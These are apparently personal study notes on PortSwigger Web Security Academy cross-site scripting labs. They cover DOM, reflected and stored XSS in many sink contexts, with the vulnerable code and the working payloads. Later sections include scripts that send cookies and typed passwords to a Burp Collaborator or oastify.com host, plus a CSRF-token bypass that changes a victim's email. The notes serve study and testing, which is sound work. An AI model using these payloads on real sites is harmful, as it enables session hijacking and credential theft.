# Various Encounters with XSS

# DOM XSS in ```document.write``` sink using source ```location.search```
## Observations
- Queries are reflected in the page after searching. 
- JavaScript in the page after searching uses unsafe DOM objects with the user input. 
- Summary of JS:
1. The trackSearch function
```
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
```
	•	Defines a function trackSearch that takes a string query.
	•	When called, it writes raw HTML directly into the document (document.write).
	•	That HTML is an <img> tag, pointing to:
/resources/images/tracker.gif?searchTerms=<whatever query is>
	•	This acts like a tracking pixel: the image loads (even if it’s 1x1 invisible), sending the user’s search query to the server via the query string.
2. Extracting the search parameter from the URL
```
var query = (new URLSearchParams(window.location.search)).get('search');
```
	•	window.location.search = everything after the ? in the URL.
Example:
https://site.com/page?search=dogs

```window.location.search = "?search=dogs"```
	•	new URLSearchParams(...) parses the query string into key/value pairs.
	•	.get('search') pulls out the value of the search parameter.
Example: dogs
	•	So if the URL has ?search=dogs, then query = "dogs".

3. Conditional execution
```
if(query) {
    trackSearch(query);
}
```
	•	If a search parameter exists and isn’t null/empty, the script calls trackSearch(query).
	•	That means the tracking pixel only loads if there is a search term in the URL.

4. Putting it all together
	•	User navigates to:
https://site.com/page?search=dogs
	•	Script runs:
	•	Extracts "dogs"
	•	Injects into page:
```<img src="/resources/images/tracker.gif?searchTerms=dogs">```
	•	Browser requests /resources/images/tracker.gif?searchTerms=dogs
	•	Server logs that request → now the site operators know someone searched "dogs".

So, I threw a Canary into the search, found the sink and used DOMInvader to solve the challenge. 

# DOM XSS in ```innerHTML``` sink
## Observations
Similar to the above issue:
```
<script>
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        doSearchQuery(query);
    }
</script> 
```
- Threw my DOM Invader canary into the search to find the sink and then used it to finish the lab.

# DOM XSS in jQuery selector sink using a hashchange event
## Observations
```
<script>
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });
</script>
```
https://developer.mozilla.org/en-US/docs/Web/API/Window/hashchange_event

- Within the page itself, there is no hash routing being used. But, we're provided an exploit server so its probably something that requires coercion. 
- That was it, here's the payload:
```
<iframe src="https://0a1800b3048970db81884353006c00c4.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
At first, I didn't have this.src but it worked on me and I couldn't figure that out. 
Here's an analysis of why that is:
- They run in different contexts:
-- The first payload without the this.src was running in the original page that I loaded the iframe in, not the iframe where the vulnerable DOM sink was. 
-- The second payload actually runs in the target window within the iframe so the # is replaced by the payload and provided to the sink for execution. 

	•	Payload 1 (works)
```
<iframe src="https://victim/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
This doesn’t try to run print() itself. Instead, it mutates the iframe’s URL fragment (adds #<img src=x onerror=print()>). That triggers a hashchange inside the framed page. The victim page’s script runs on that event:
```
$(window).on('hashchange', function () {
  var q = decodeURIComponent(window.location.hash.slice(1));
  var post = $('section.blog-list h2:contains(' + q + ')');
  if (post) post.get(0).scrollIntoView();
});
```
Because the code directly concatenates the decoded hash into a jQuery selector without quoting, your attacker-controlled fragment is consumed by the victim’s own JS in the victim context (the iframe’s window). That’s the crucial bit: you’re not executing from your page; you’re making the victim page execute with your data, which is what makes the exploit “land”.

	•	Payload 2 (doesn’t work)

```<iframe src="https://victim/#" onload=print()></iframe>```

The onload handler here runs in the parent document’s execution context (the page that contains the <iframe>), not inside the framed origin. So print() targets the parent page, not the victim page. Modern browsers also often suppress window.print() when it’s called on load without a user gesture—especially from an <iframe>—so nothing visible happens for the victim.

# Stored XSS into anchor href attribute with double quotes HTML - encoded
Get an alert to pop. 
##Observations 
- The username for some odd reason, created an href link within your name when you post a comment. 
- Goal - find a payload that will work in the URL to pop an alert when a victim clicks on my username.
- The website value that was being passed to the comment was being used as a hyperlink reference with the user's name as the display-as. So, with no real URL validation the payload ```javascript:alert(1)``` achieves the goal. 

# Reflected XSS into a JavaScript string with angle brackets HTML encoded
Get an alert box. 
## Observations
```
<script>
    var searchTerms = 'test';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
The search term is reflected in an image tracker in the URL. However double quotes and angle bracket is encoded to prevent XSS. 
However, we can see that we can escape that by closing the single quotes around test prematurely and then exeuting alert because we're already inside of a javascript block. 
```
'; alert();//'
```
This makes the script block look like this:
```
<script>
    var searchTerms = ''; alert();//'';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

# DOM XSS in document.write sink using source location.search inside a select element
Get an alert box. 
## Observations
- Interestiong script block:
```
<script>
    var stores = ["London","Paris","Milan"];
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');
    if(store) {
        document.write('<option selected>'+store+'</option>');
        }
    for(var i=0;i<stores.length;i++) {
        if(stores[i] === store) {
            continue;
        }
        document.write('<option>'+stores[i]+'</option>');
    }
    document.write('</select>');
</script>
```
- The script is looking for the storeId param in the URL which we can provide the DOM Invader canary to along with a product ID to find the sink. 
https://0a8d0017048671f081543917006f0029.web-security-academy.net/product?storeId=oeyiugzj&productId=1

- Interestingly, this works and seems correct but didn't solve the challenge:
```
https://0a8d0017048671f081543917006f0029.web-security-academy.net/product?storeId=%3Cimg%20src=x%20onerror=alert()%3E%3C/img%3E&productId=1
```
Stupidly, it want's this payload specifically:
```
productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```

# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
Get an alert box from HTML nodes containing the ng-app attribute from Angular JS.
## Observations
- No odd JS in the body of the pages. 
- It does pull in angular_1-7-7.js which other pages haven't done. So, I am going to research that. 

# Reflected XSS into HTML context with most tags and attributes blocked
Get a print() action without user interaction. 

## Observations
- Search box reflects user input but there isn't any funky JS in the response body. 
- Tried typical script payload and it says, "tag is not allowed". Probably best to send'er to Intruder and throw a payload list at it. 
-- Tried Intruder with a payload list, nothing seemed to pop. 
-- Trying with Dalfox in URL mode - no luck. 
- Crafted a payload list with Cursor that included body tags. Providing ```<body =1>``` works. 
- Need to weaponize it and onload won't work. Found that onresize works so we'll need to ensure that we specify a size with the iframe to deliver the payload. 
- Setting up exploit server - we need to do the iframe payload thing and make sure the execution context of the iframe and script is the victim's page, not the iframe hosting page. 
```
<iframe src="[URL]/?search="><body onresize=print()>" onload=this.style.width='100px'>
```
Crafted up some lists for working through blacklisted tags and subsequent payload execution discovery. 

# Reflected XSS into HTML context with all tags blocked except custom ones
Get document.cookie to pop. 
## Observations
- As seen with the previous list, no html tags are allowed BUT custom tags work. 
- With this ability to inject custom tags, we need to craft a payload that will trigger JS. 
-- Crafting a custom tag with an focusable element like tabindex=1 tells the browser "this element can receive focus" and we can target that element with a URL fragment (#x) We then use a trailing fragment to trigger the attack:
```
<evil id=go tabindex=1 onfocus=alert(1)>#go
```
- Final payload:
```
<script>
location = 'https://0af0006004c110408073036000b9000d.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
-- NOTE: the reason we need to use <script> rather than an <iframe> here is that focus doesn't propogate into cross-origin iframes onload. 

# Reflected XSS with some SVG markup allowed
Pop an alert box. 
## Observations
- Search box and comments available as vectors - search box content is not in URL and no interesting JS in search. The comments don't look overly interesting BUT I do see that someone posted in French and their apostrophes are encoded so we're up against that. 
- Back to search for initial hunting.
-- Trying payloads, we find that ```<svg id=x onfocus=alert(1)>``` tags are allowed but event isn't. 
-- Needed to find the right event which took some digging on PS's list. 
```
"><svg><animatetransform onbegin=alert(1)>
```
# Reflected XSS in canonical link tag
Get an alert box. 
Odd instructions:
To assist with your exploit, you can assume that the simulated user will press the following key combinations:

ALT+SHIFT+X
CTRL+ALT+X
Alt+X
## Observations
- No search this time. Just comments. 
- Comments don't seem vulnerable. 
- Trying Dalfox - flagged that pretty much any parameter that's appended gets processed into the page, turns out there is canoncial link tag. 
- Payload will require user interaction:
```
'accesskey='x'onclick='alert(1)
```

# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
Get an alert box
## Observations
- DOM Intruder popped in the search query. element.setAttribute.href
- AngularJS is passing the payload to a sink that encods angle brackets and double quotes so we need to use something specific:
```
{{$on.constructor('alert(1)')()}}
```

# Reflected DOM XSS
get an alert box
## Observations
- DOM Invader shows the canary is passed to an eval sink within the search function. However, typical payloads aren't working. 
- Review of resources/js/searchResults.js
```
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

        for (var i = 0; i < searchResults.length; ++i)
        {
            var searchResult = searchResults[i];
            if (searchResult.id) {
                var blogLink = document.createElement("a");
                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

                if (searchResult.headerImage) {
                    var headerImage = document.createElement("img");
                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += "<br/>";

            if (searchResult.title) {
                var title = document.createElement("h2");
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            if (searchResult.summary) {
                var summary = document.createElement("p");
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            if (searchResult.id) {
                var viewPostButton = document.createElement("a");
                viewPostButton.setAttribute("class", "button is-small");
                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                viewPostButton.innerText = "View post";
            }
        }

        var linkback = document.createElement("div");
        linkback.setAttribute("class", "is-linkback");
        var backToBlog = document.createElement("a");
        backToBlog.setAttribute("href", "/");
        backToBlog.innerText = "Back to Blog";
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}
```
- The risky link is ```eval('var searchResultsObj = ' + this.responseText);```
- We need to break out of the context to get exection, something like ```x");alert(1);//```
- That payload didn't quite escape the context the way I needed it to. Ultimately, ```\"-alert(1)}//``` was the right payload. 
-- The reason for this is that this payload actually changes the parser state so that the code lands outside the string and the rest of the JSON gets safely ignored. 
```
// sink
eval('var searchResultsObj = ' + RESPONSE);
// typical RESPONSE shape built server-side:
{"searchTerm":"<YOUR_INPUT>","results":[...]}
```
The forward slash effectively soaks of up the quote from the previous code block. Giving us this:
```
var searchResultsObj = {"searchTerm":"\"-alert(1)}//", "results":[...]}
                     //            ^ escapes this quote ↑  ↑ closes }   ↑ comments out the rest
                     // the alert runs here -------------^
```

# Reflected XSS into a JavaScript string with single quote and backslash escaped
Get an alert box
## Observations
- Script block:
```
<script>
    var searchTerms = 'test';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
- We can see that the payload 'test' is encased in single quotes. BUT we can see that we could close the script block early by starting a payload with ```</script>```
- Final payload ```</script><script>alert(1)</script>```

# Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
Get an alert box. 
## Observations
```
<script>
    var searchTerms = 'test';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
- With the filtering and encoding we're running into we can effectively soak up the JS and escape it. 
``` \'-alert(1)//```

# Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
Pop an alert
## Observations 
- Encoding:
```
<section class="comment">
    <p>
        <img src="/resources/images/avatarDefault.svg" class="avatar"> <a id="author" href="http://h39uymrn.com" onclick="var tracker={track(){}};tracker.track('http://h39uymrn.com');">h39uymrn</a> | 07 September 2025
    </p>
    <p>Sink test h39uymrn</p>
    <p></p>
</section>
```
- Payload to get it to work: ``` http://foo?&apos;-alert(1)-&apos; ```
This makes the body look like:
```
<section class="comment">
    <p>
    <img src="/resources/images/avatarDefault.svg" class="avatar"> <a id="author" href="http://foo?&apos;-alert(1)-&apos;" onclick="var tracker={track(){}};tracker.track('http://foo?&apos;-alert(1)-&apos;');">Test</a> | 07 September 2025
    </p>
    <p>Test</p>
    <p></p>
</section>
```
This is a context-mismatch bug: user input is inserted into an inline event handler. The server applies HTML entity encoding to quotes, but the browser decodes those entities before the handler is parsed as JavaScript, enabling string breakout and code execution. Fix by removing inline handlers (use addEventListener), or by correctly JS-escaping user data (e.g., via JSON.stringify), and enforce CSP that disallows inline event handlers.
The HTML parser decodes entities inside attribute values.
```&apos;``` becomes a literal ```'```.
The onclick code that the JS engine receives is effectively:
```
var tracker = { track(){} };
tracker.track('http://foo?' - alert(1) - '');
```

# Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
Get an alert box.
## Observations
```
<script>
    var message = `1 search results for 'test'`;
    document.getElementById('searchMessage').innerText = message;
</script>
```
- Because of all the encoded characters we're limited to template literal interpolation which means that $ { } and ` stil parse and the code will run inside the template. 
```
${alert()}
```

# Exploiting cross-site scripting to steal cookies
Steal the victim's cookie and then impersonate them. 
## Observations
- Probably a stored XSS.
- The comment field is vulnerable. Simple cookie stealer:
```
<script>
    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
</script>
```
Took the session token from the COLLABORATOR and replaced mine to get the Admin's session. 

# Exploiting XSS to bypass CSRF defenses
Change the email address of another user
## Observations
- Can log in as weiner:peter and can see the CSRF token on the email change form. 
- Need to develop an xss to bypass that CSRF token so that the victim will submit their own token:
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
- The comment field is vulnerable to XSS. 
- The unusual thing about this lab was that it allowed login and email change and had XSS but most XSS labs here don't have logins 

# Exploiting cross-site scripting to capture passwords
Steal passwords
## Observations
- XSS is in the comments field of the form. 
- Another XSS challenge that does have a username and password login function but wiener peter doesn't work. 
- Need to either create and XSS payload to steal creds or CSRF. 
- Turns out the victim will type username and password into hidden fields which is almost unrealistic outside of maybe a password manager or stored passwords. The page doesn't contain anything that would give the victim a legit reason to type the username or password on this page. 
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

# Stored DOM XSS
Get an alert box
## Observations
- Only blog comments. DOM Intruder shows that there are viable sinks. 
- There's a JS file that is loading the canary. 
```
function loadComments(postCommentPath) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
    };
    xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();

    function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }

    function displayComments(comments) {
        let userComments = document.getElementById("user-comments");

        for (let i = 0; i < comments.length; ++i)
        {
            comment = comments[i];
            let commentSection = document.createElement("section");
            commentSection.setAttribute("class", "comment");

            let firstPElement = document.createElement("p");

            let avatarImgElement = document.createElement("img");
            avatarImgElement.setAttribute("class", "avatar");
            avatarImgElement.setAttribute("src", comment.avatar ? escapeHTML(comment.avatar) : "/resources/images/avatarDefault.svg");

            if (comment.author) {
                if (comment.website) {
                    let websiteElement = document.createElement("a");
                    websiteElement.setAttribute("id", "author");
                    websiteElement.setAttribute("href", comment.website);
                    firstPElement.appendChild(websiteElement)
                }

                let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
                firstPElement.innerHTML = newInnerHtml
            }

            if (comment.date) {
                let dateObj = new Date(comment.date)
                let month = '' + (dateObj.getMonth() + 1);
                let day = '' + dateObj.getDate();
                let year = dateObj.getFullYear();

                if (month.length < 2)
                    month = '0' + month;
                if (day.length < 2)
                    day = '0' + day;

                dateStr = [day, month, year].join('-');

                let newInnerHtml = firstPElement.innerHTML + " | " + dateStr
                firstPElement.innerHTML = newInnerHtml
            }

            firstPElement.appendChild(avatarImgElement);

            commentSection.appendChild(firstPElement);

            if (comment.body) {
                let commentBodyPElement = document.createElement("p");
                commentBodyPElement.innerHTML = escapeHTML(comment.body);

                commentSection.appendChild(commentBodyPElement);
            }
            commentSection.appendChild(document.createElement("p"));

            userComments.appendChild(commentSection);
        }
    }
};
```
The value is in the element.innerHTML:
```
<section class="comment"><p><a id="author" href="http://h39uymrn.com"></a>h39uymrn | 06-09-2025<img class="avatar" src="/resources/images/avatarDefault.svg"></p><p>h39uymrn</p><p></p></section>
```
- The URL value actually isn't the issue here even though the canary sinks there, it is in how the string encodes angle brackets. It only encodes the first set. So, this payload works:
```<><img src=1 onerror=alert(1)>```

String.replace only hits once. 
```
return html.replace('<', '&lt;').replace('>', '&gt;');
```
# DOM XSS in jQuery anchor href attribute sink using location.search source
## Observations
In page body: 
```
<script>
    $(function() {
        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
</script>
```

Used DOM invader to inject canary into URL param and opened it in a new tab - https://0a8500910332b81c8136301a009d00d8.web-security-academy.net/feedback?returnPath=uf38wv08

Used dom invader's Exploit function to solve. 

# Difficult to find Stored XSS in Cookie
Delete user
## Observations
- The cookie had a username prepended to the session cookie value. 
- By doing a targeted scan of the selected insertion point of "session=wiener" I was able to find the XSS. 
- From there, crafted an XSS payload that would trigger a server error which, when stored, is viewed by the Administrator to steal their cookies. 
```
GET /my-account?id=wiener HTTP/2
Host: 0af1006e038e647180be58cb000f00b0.web-security-academy.net
Cookie: session='"><svg/onload%3dfetch(`//9isaatt2k90ql266z8zy89mfs6yxmzao.oastify.com/${encodeURIComponent(document.cookie)}`)>%3aEJh989nkd7SdvJWKBx5LZpPK8gqeEL5Y; session='"><svg/onload%3dfetch(`//9isaatt2k90ql266z8zy89mfs6yxmzao.oastify.com/${encodeURIComponent(document.cookie)}`)>%3aonMhHFh71wmQgSHOnPKWQJXxmmkqydOY
```
Plain-text payload:
```
'"><svg/onload=fetch(`//URL/${encodeURIComponent(document.cookie)}`)>
```
